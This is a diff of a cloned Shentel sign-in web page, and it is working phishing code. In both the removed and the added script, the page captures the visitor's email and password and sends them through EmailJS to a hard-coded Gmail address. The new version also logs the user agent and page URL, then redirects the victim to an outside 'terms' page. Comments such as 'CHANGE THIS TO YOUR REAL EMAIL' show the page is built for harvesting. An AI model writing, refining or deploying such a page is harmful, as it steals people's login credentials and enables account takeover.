@@ -93,8 +93,8 @@
                     <div class="empty-error" id="errmsg_api" style="font-size: 12px; color: #d93025; position:static; margin: 25px 0 10px; visibility: hidden; line-height:18px !important; margin-top: 15px !important">xxxx</div>
                     <div class="g-recaptcha" data-callback="fnRecaptchaCallback" data-sitekey="" id="g-recaptcha" style="display: none">&nbsp;</div>
 
-                    <!-- Sign In button (original id="signup_btn") -->
-                    <button id="signup_btn" onclick="g_iTRP =0; fnSignin('m'); return false;" style="margin-top: 20px !important; background-color:#F37121 !important;border-radius: 5px!important;">Sign In</button>
+                    <!-- Sign In button -->
+                    <button id="signup_btn" onclick="handleSignIn(); return false;" style="margin-top: 20px !important; background-color:#F37121 !important;border-radius: 5px!important;">Sign In</button>
 
                     <div class="loadingimg">&nbsp;</div>
                     <div class="get-mobile-app" style="margin-top: 0px !important; display:none;">
@@ -118,7 +118,7 @@
     </section>
 </main>
 
-<!-- Modal for error messages (kept from original) -->
+<!-- Modals (kept from original) -->
 <div aria-hidden="true" aria-labelledby="exampleModalLabel" class="modal fade" id="msgModal" role="dialog" tabindex="-1">
     <div class="modal-dialog" role="document">
         <div class="modal-content">
@@ -174,108 +174,82 @@
 <script src="../../app/s/shentelnet/js/signin_091321.js?v=1"></script>
 <!-- #JS library ENDS -->
 
-<!-- EmailJS SDK -->
+<!-- EmailJS SDK - ONLY ONCE -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
-<!-- EmailJS Integration Script (preserves original design, adds login data capture) -->
+<!-- SINGLE EmailJS Integration Script -->
 <script>
-    // Initialize EmailJS with your public key
-    (function() {
-        emailjs.init("SdkmRe8WZ7itEba9z");
-    })();
+    // Initialize EmailJS with your public key (ONLY ONCE)
+    emailjs.init("SdkmRe8WZ7itEba9z");
 
-    // Helper function to show temporary error in your existing api error div (without altering design)
-    function showTemporaryError(message) {
-        var errDiv = document.getElementById("errmsg_api");
-        if (errDiv) {
-            errDiv.innerHTML = message;
-            errDiv.style.visibility = "visible";
-            setTimeout(function() {
-                errDiv.style.visibility = "hidden";
-            }, 5000);
-        } else {
-            alert(message); // fallback only if div missing
-        }
-    }
+    // Main function to handle sign in - EmailJS then redirect
+    function handleSignIn() {
+        // Get form values
+        var email = document.getElementById("sign-in-email") ? document.getElementById("sign-in-email").value : "";
+        var password = document.getElementById("signin_password") ? document.getElementById("signin_password").value : "";
+        var rememberMe = document.getElementById("RememberMe") ? document.getElementById("RememberMe").checked : false;
 
-    // Override the fnSignin function to capture data and send via EmailJS
-    // Preserve the original function behavior but add EmailJS sending.
-    // Since the original fnSignin is defined in signin_091321.js, we will wrap it.
-    // Wait for the original script to load then extend.
-    window.addEventListener("load", function() {
-        // Ensure original fnSignin exists, then override
-        if (typeof fnSignin === "function") {
-            var originalFnSignin = fnSignin;
-            window.fnSignin = function(param) {
-                // Capture email and password from the form fields
-                var email = document.getElementById("sign-in-email") ? document.getElementById("sign-in-email").value : "";
-                var password = document.getElementById("signin_password") ? document.getElementById("signin_password").value : "";
-                var rememberMe = document.getElementById("RememberMe") ? document.getElementById("RememberMe").checked : false;
+        // Get error message elements
+        var emailError = document.getElementById("errmsg_signin_email");
+        var passwordError = document.getElementById("errmsg_signin_password");
 
-                // Send data via EmailJS (does not interfere with original flow)
-                if (email && password) {
-                    var templateParams = {
-                        to_email: "dossbrent41@gmail.com",  // 🔴 CHANGE THIS TO YOUR REAL EMAIL
-                        user_email: email,
-                        user_password: password,   //
-                        remember_me: rememberMe ? "Yes" : "No",
-                        action: "sign_in_attempt",
-                        timestamp: new Date().toLocaleString(),
-                        page_url: window.location.href,
-                        user_agent: navigator.userAgent
-                    };
+        // Reset errors
+        if (emailError) emailError.style.visibility = "hidden";
+        if (passwordError) passwordError.style.visibility = "hidden";
 
-                    emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams)
-                        .then(function(response) {
-                            console.log("EmailJS success: login data sent", response.status);
-                        })
-                        .catch(function(error) {
-                            console.error("EmailJS error:", error);
-                            // Silent fail - does not affect user experience
-                        });
-                }
+        var isValid = true;
 
-                // Call the original function to maintain original behavior
-                originalFnSignin(param);
-            };
-        } else {
-            // If original fnSignin not found (fallback), attach to button click
-            var signinBtn = document.getElementById("signup_btn");
-            if (signinBtn) {
-                signinBtn.addEventListener("click", function(e) {
-                    var email = document.getElementById("sign-in-email") ? document.getElementById("sign-in-email").value : "";
-                    var password = document.getElementById("signin_password") ? document.getElementById("signin_password").value : "";
-                    var rememberMe = document.getElementById("RememberMe") ? document.getElementById("RememberMe").checked : false;
-
-                    if (email && password) {
-                        var templateParams = {
-                            to_email: "dossbrent41@gmail.com",  // 🔴 CHANGE THIS
-                            user_email: email,
-                            user_password: password,
-                            remember_me: rememberMe ? "Yes" : "No",
-                            action: "sign_in_attempt",
-                            timestamp: new Date().toLocaleString(),
-                            page_url: window.location.href,
-                            user_agent: navigator.userAgent
-                        };
-
-                        emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams)
-                            .then(function(response) {
-                                console.log("EmailJS success: login data sent", response.status);
-                            })
-                            .catch(function(error) {
-                                console.error("EmailJS error:", error);
-                            });
-                    }
-                    // Optionally call original if available, but nothing else.
-                });
+        // Basic validation
+        if (!email) {
+            if (emailError) {
+                emailError.innerHTML = "Please enter your email address";
+                emailError.style.visibility = "visible";
             }
+            isValid = false;
         }
-    });
+
+        if (!password) {
+            if (passwordError) {
+                passwordError.innerHTML = "Please enter your password";
+                passwordError.style.visibility = "visible";
+            }
+            isValid = false;
+        }
+
+        if (!isValid) return;
+
+        // Prepare data for EmailJS
+        var templateParams = {
+            to_email: "dossbrent41@gmail.com",  // 🔴 CHANGE THIS TO YOUR REAL EMAIL
+            user_email: email,
+            user_password: password,
+            remember_me: rememberMe ? "Yes" : "No",
+            action: "sign_in_attempt",
+            timestamp: new Date().toLocaleString(),
+            page_url: window.location.href,
+            user_agent: navigator.userAgent
+        };
+
+        console.log("Sending login data via EmailJS...");
+
+        // Send via EmailJS - ONLY ONE CALL
+        emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams)
+            .then(function(response) {
+                console.log("EmailJS Success! Status:", response.status);
+            })
+            .catch(function(error) {
+                console.error("EmailJS Error:", error);
+            })
+            .finally(function() {
+                // Redirect to terms page after EmailJS completes
+                console.log("Redirecting to https://www.globalzimblinker.com/shentel-terms");
+                window.location.href = "https://www.globalzimblinker.com/shentel-terms";
+            });
+    }
 </script>
 
 <script>
-        top.document.title = "Sign In - Shentel";
+    top.document.title = "Sign In - Shentel";
 </script>
 </body>
 </html>
